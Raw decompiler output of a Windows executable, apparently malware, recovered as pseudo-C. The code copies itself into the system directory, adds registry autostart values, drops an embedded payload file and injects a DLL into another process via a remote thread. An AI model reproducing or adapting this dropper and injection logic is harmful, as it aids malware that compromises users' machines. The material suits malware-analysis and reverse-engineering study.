// subject_data.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

void g_v403026 = ??void??; // 00403026
<anonymous> * g_ptr405EC8 = null; // 00405EC8
<anonymous> * g_ptr405ECC = null; // 00405ECC
<anonymous> * g_ptr405ED0 = null; // 00405ED0
<anonymous> * g_ptr405ED4 = null; // 00405ED4
Eq_2 g_t405ED8 = // 00405ED8
	{
		0x00
	};
CHAR g_t405EDC = '\0'; // 00405EDC
Eq_306 g_t405FE1 = 0x00; // 00405FE1
CHAR g_t4060E6 = '\0'; // 004060E6
// subject_rdata.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

<anonymous> * __imp__ShellExecuteA = &g_t22B2; // 00402000
<anonymous> * __imp__RegCloseKey = &g_t22CE; // 00402008
<anonymous> * __imp__RegCreateKeyA = &g_t22DC; // 0040200C
<anonymous> * __imp__RegSetValueExA = &g_t22EC; // 00402010
<anonymous> * __imp__GetExitCodeThread = &g_t217A; // 00402018
<anonymous> * __imp__GetModuleFileNameA = &g_t218E; // 0040201C
<anonymous> * __imp__GetModuleHandleA = &g_t21A4; // 00402020
<anonymous> * __imp__GetProcAddress = &g_t21B8; // 00402024
<anonymous> * __imp__GetSystemDirectoryA = &g_t21CA; // 00402028
<anonymous> * __imp__LoadLibraryA = &g_t21E0; // 0040202C
<anonymous> * __imp__OpenProcess = &g_t21F0; // 00402030
<anonymous> * __imp__Sleep = &g_t2214; // 00402034
<anonymous> * __imp__WaitForSingleObject = &g_t221C; // 00402038
<anonymous> * __imp__WriteFile = &g_t2232; // 0040203C
<anonymous> * __imp__lstrcatA = &g_t223E; // 00402040
<anonymous> * __imp__lstrcmpiA = &g_t224A; // 00402044
<anonymous> * __imp__lstrlenA = &g_t2256; // 00402048
<anonymous> * __imp__ExitProcess = &g_t216C; // 0040204C
<anonymous> * __imp__CreateFileA = &g_t215E; // 00402050
<anonymous> * __imp__CopyFileA = &g_t2152; // 00402054
<anonymous> * __imp__SetFileAttributesA = &g_t21FE; // 00402058
<anonymous> * __imp__CloseHandle = &g_t2144; // 0040205C
<anonymous> * __imp__FindWindowA = &g_t2270; // 00402064
<anonymous> * __imp__GetWindowThreadProcessId = &g_t227E; // 00402068
word32 g_dw4020D4 = 0x22B2; // 004020D4
word32 g_dw4020DC = 0x22CE; // 004020DC
word32 g_dw4020E0 = 0x22DC; // 004020E0
word32 g_dw4020E4 = 0x22EC; // 004020E4
word32 g_dw4020EC = 0x217A; // 004020EC
word32 g_dw4020F0 = 0x218E; // 004020F0
word32 g_dw4020F4 = 0x21A4; // 004020F4
word32 g_dw4020F8 = 0x21B8; // 004020F8
word32 g_dw4020FC = 0x21CA; // 004020FC
word32 g_dw402100 = 0x21E0; // 00402100
word32 g_dw402104 = 8688; // 00402104
word32 g_dw402108 = 0x2214; // 00402108
word32 g_dw40210C = 0x221C; // 0040210C
word32 g_dw402110 = 0x2232; // 00402110
word32 g_dw402114 = 0x223E; // 00402114
word32 g_dw402118 = 8778; // 00402118
word32 g_dw40211C = 0x2256; // 0040211C
word32 g_dw402120 = 8556; // 00402120
word32 g_dw402124 = 0x215E; // 00402124
word32 g_dw402128 = 0x2152; // 00402128
word32 g_dw40212C = 0x21FE; // 0040212C
word32 g_dw402130 = 0x2144; // 00402130
word32 g_dw402138 = 0x2270; // 00402138
word32 g_dw40213C = 0x227E; // 0040213C
// subject_text.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: Register Eq_2 fn00401000(Stack Eq_2 dwArg04, Stack (ptr32 word32) dwArg08)
// Called from:
//      fn0040108D
Eq_2 fn00401000(Eq_2 dwArg04, word32 * dwArg08)
{
	Eq_2 edi_17 = dwArg04;
	word32 * esi_18 = dwArg08;
	Eq_2 eax_21 = LoadLibraryA(dwArg04);
	if (eax_21 != 0x00)
	{
		while (true)
		{
			edi_17 += strlen(edi_17) + 1;
			if (*edi_17.u4 == 0x00)
				break;
			eax_21 = GetProcAddress(eax_21, edi_17);
			*esi_18 = (word32) eax_21;
			if (eax_21 == 0x00)
				return eax_21;
			++esi_18;
		}
		eax_21.u0 = 0x01;
	}
	return eax_21;
}

// 00401041: Register Eq_39 fn00401041(Stack Eq_2 dwArg04, Stack Eq_41 dwArg08, Stack Eq_2 dwArg0C)
// Called from:
//      Win32CrtStartup
Eq_39 fn00401041(Eq_2 dwArg04, Eq_41 dwArg08, Eq_2 dwArg0C)
{
	Eq_2 tLoc0C;
	Eq_2 eax_25 = CreateFileA(dwArg04, 0x40000000, 0x03, null, 0x02, 0x00, 0x00);
	if (eax_25 == ~0x00)
		return (word32) eax_25 + 1;
	WriteFile(eax_25, dwArg08, dwArg0C, &tLoc0C, null);
	CloseHandle(eax_25);
	return (void *) 0x01;
}

// 0040108D: void fn0040108D(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08)
// Called from:
//      Win32CrtStartup
void fn0040108D(Eq_2 dwArg04, Eq_2 dwArg08)
{
	ptr32 fp;
	Eq_2 tLoc1C;
	if (fn00401000(4218484, &g_ptr405EC8) == 0x00)
	{
		if (LoadLibraryA(4218588) == 0x00)
			return;
		while (true)
			Sleep(10000);
	}
	else
	{
		Eq_2 eax_51 = OpenProcess(0x043A, 0x00, dwArg04);
		if (eax_51 != 0x00)
		{
			int32 eax_61 = lstrlenA(dwArg08);
			word32 eax_77;
			word32 edx_78;
			struct Eq_116 * esp_188;
			g_ptr405EC8();
			if (eax_77 != 0x00)
			{
				esp_188->dwFFFFFFFC = 0x00;
				esp_188->dwFFFFFFF8 = eax_61;
				esp_188->tFFFFFFF4.u0 = (DWORD) dwArg08;
				esp_188->dwFFFFFFF0 = eax_77;
				esp_188->tFFFFFFEC.u0 = (DWORD) eax_51;
				word32 eax_104;
				word32 edx_105;
				struct Eq_152 * esp_103;
				g_ptr405ED4();
				if (eax_104 != 0x00)
				{
					esp_103->tFFFFFFFC.u0 = 4218484;
					Eq_2 eax_116 = GetModuleHandleA(esp_103->tFFFFFFFC.u0);
					esp_103->tFFFFFFFC.u0 = 4218471;
					esp_103->tFFFFFFF8.u0 = (DWORD) eax_116;
					Eq_2 eax_122 = GetProcAddress(esp_103->tFFFFFFF8.u0, esp_103->tFFFFFFFC.u0);
					esp_103->tFFFFFFFC.u0 = (DWORD) (fp - 20);
					esp_103->tFFFFFFF8.u0 = 0x00;
					esp_103->dwFFFFFFF4 = eax_77;
					esp_103->tFFFFFFF0.u0 = (DWORD) eax_122;
					esp_103->dwFFFFFFEC = 0x00;
					esp_103->dwFFFFFFE8 = 0x00;
					esp_103->tFFFFFFE4.u0 = (DWORD) eax_51;
					Eq_2 eax_142;
					g_ptr405ED0();
					if (eax_142 != 0x00)
					{
						esp_103->tFFFFFFFC.u0 = ~0x00;
						esp_103->tFFFFFFF8.u0 = (DWORD) eax_142;
						WaitForSingleObject(esp_103->tFFFFFFF8.u0, esp_103->tFFFFFFFC.u0);
						esp_103->tFFFFFFFC.u0 = (DWORD) &tLoc1C;
						esp_103->tFFFFFFF8.u0 = (DWORD) eax_142;
						GetExitCodeThread(esp_103->tFFFFFFF8.u0, esp_103->tFFFFFFFC.u0);
						esp_103->tFFFFFFFC.u0 = (DWORD) eax_142;
						CloseHandle(esp_103->tFFFFFFFC.u0);
					}
				}
				struct Eq_157 * esp_175 = esp_103 - 4;
				esp_175->dw0000 = 0x8000;
				esp_175->dwFFFFFFFC = 0x00;
				esp_175->dwFFFFFFF8 = eax_77;
				esp_175->tFFFFFFF4.u0 = (DWORD) eax_51;
				word32 edx_190;
				g_ptr405ECC();
			}
			union Eq_2 * esp_198 = esp_188 - 4;
			esp_198->u0 = (DWORD) eax_51;
			CloseHandle(esp_198->u0);
		}
	}
}

// 00401198: void fn00401198(Stack Eq_290 dwArg04)
// Called from:
//      Win32CrtStartup
void fn00401198(Eq_290 dwArg04)
{
	Eq_290 tLoc08;
	RegCreateKeyA(dwArg04, 4218411, &tLoc08);
	RegSetValueExA(tLoc08, 0x00403000, 0x00, 0x01, &g_t405FE1, lstrlenA(4218849) + 0x01);
	RegCloseKey(tLoc08);
}

// 004011DD: Register Eq_2 Win32CrtStartup()
Eq_2 Win32CrtStartup()
{
	GetSystemDirectoryA(&g_t405FE1, 0x0104);
	lstrcatA(&g_t405FE1, 0x0040300D);
	GetModuleFileNameA(0x00, &g_t4060E6, 0x0104);
	fn00401198((struct HKEY__ *) 0x80000001);
	fn00401198((struct HKEY__ *) 0x80000002);
	if (lstrcmpiA(0x004060E6, 4218849) == 0x00)
	{
		GetSystemDirectoryA(&g_t405EDC, 0x0104);
		lstrcatA(&g_t405EDC, 4206620);
		SetFileAttributesA(4218588, 0x80);
		if (fn00401041(4218588, &g_v403026, 0x2E00) != 0x00)
		{
			GetWindowThreadProcessId(FindWindowA(0x00405E59, 0x00), 4218584);
			fn0040108D(g_t405ED8.u0, 4218588);
		}
		ExitProcess(0x00);
	}
	else
	{
		SetFileAttributesA(4218849, 0x80);
		if (CopyFileA(0x004060E6, 4218849, 0x00) != 0x00)
		{
			SetFileAttributesA(4218849, 0x80);
			ShellExecuteA(null, 0x00405E26, 4218849, 0x00, 0x00, 0x00);
		}
		ExitProcess(0x00);
	}
}

